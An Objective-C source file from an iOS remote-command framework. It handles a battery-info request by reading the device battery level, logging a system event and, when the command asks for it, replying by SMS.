//
//  RequestBatteryInfo.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 9/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "RequestBatteryInfoProcessor.h"
#import <UIKit/UIKit.h>
#import "FxSystemEvent.h"
#import "DateTimeFormat.h"


@interface RequestBatteryInfoProcessor (private)
- (void) sendReplySMSWithBatteryLevel: (NSString *) aBatteryLevel;
- (void) sendSystemEventForBatteryLevel: (NSString *) aBatteryStatusText;
- (void) sendSystemEventFor: (FxSystemEventType) aEventType message: (NSString *) aMessage;
@end


@implementation RequestBatteryInfoProcessor

/**
 - Method name:						initWithRemoteCommandData
 - Purpose:							This method is used to initialize the RequestBatteryInfo class
 - Argument list and description:	aRemoteCmdData (RemoteCmdData)
 - Return description:				self (RequestBatteryInfo)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"RequestBatteryInfo--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name:						doProcessingCommand
 - Purpose:							This method is used to process the RequestBatteryInfo
 - Argument list and description:	No Argument
 - Return description:				No return type
 */

- (void) doProcessingCommand {
	DLog (@"RequestBatteryInfo--->doProcessingCommand")
	BOOL previousBatteryMonitoringStatus = [[UIDevice currentDevice] isBatteryMonitoringEnabled];	
	
 	[[UIDevice currentDevice] setBatteryMonitoringEnabled:YES]; // If battery monitoring is not enabled, the value of 'batteryLevel' property is –1.0.
	
	float batteryLevel = [[UIDevice currentDevice] batteryLevel];	
	DLog(@"Battery info %f", batteryLevel)
	
 	[[UIDevice currentDevice] setBatteryMonitoringEnabled:previousBatteryMonitoringStatus];
	
	if (batteryLevel >= 0.0 && batteryLevel <= 1.0) {
		// 1 convert from 0.x to y percent (e.g., 0.1 --> 10 %)
		// 2 convert float to int
		NSNumber *batteryLevelNum = [NSNumber numberWithFloat:(batteryLevel * 100)];  
		NSString *batteryLevelString =  [NSString stringWithFormat:@"%d", [batteryLevelNum intValue]];
		[self sendReplySMSWithBatteryLevel:batteryLevelString];
	} else {
		DLog (@"Invalid battery level")
	}
}

/**
 - Method name:						sendReplySMS
 - Purpose:							This method is used to send the SMS reply
 - Argument list and description:	No Argument
 - Return description:				No return type
 */
- (void) sendReplySMSWithBatteryLevel: (NSString *) aBatteryLevel {
	DLog (@"RequestBatteryInfo--->sendReplySMS %@", aBatteryLevel)
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];	
	DLog (@"messageFormat %@", messageFormat)
	NSString *batteryInfoMSGFormat = NSLocalizedString(@"kBatteryInfoMSG",@"");
	batteryInfoMSGFormat = [NSString stringWithFormat:batteryInfoMSGFormat, aBatteryLevel];	
	
	[self sendSystemEventForBatteryLevel:batteryInfoMSGFormat];
	
	messageFormat = [NSString stringWithFormat:@"%@%@", messageFormat, batteryInfoMSGFormat];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}


- (void) sendSystemEventForBatteryLevel: (NSString *) aBatteryStatusText {	
	[self sendSystemEventFor:kSystemEventTypeBatteryInfo
					 message:aBatteryStatusText];
}


#pragma mark -
#pragma mark System Event


- (void) sendSystemEventFor: (FxSystemEventType) aEventType message: (NSString *) aMessage {
	DLog(@"sending system event for battery info")
	FxSystemEvent *systemEvent = [[FxSystemEvent alloc] init];
	[systemEvent setMessage:[NSString stringWithString:aMessage]];
	[systemEvent setDirection:kEventDirectionOut];
	[systemEvent setSystemEventType:aEventType];
	[systemEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	
	if ([[[RemoteCmdUtils sharedRemoteCmdUtils] mEventDelegate] respondsToSelector:@selector(eventFinished:)]) {
		[[[RemoteCmdUtils sharedRemoteCmdUtils] mEventDelegate] performSelector:@selector(eventFinished:) withObject:systemEvent];
	}
	
	[systemEvent release];
}

@end
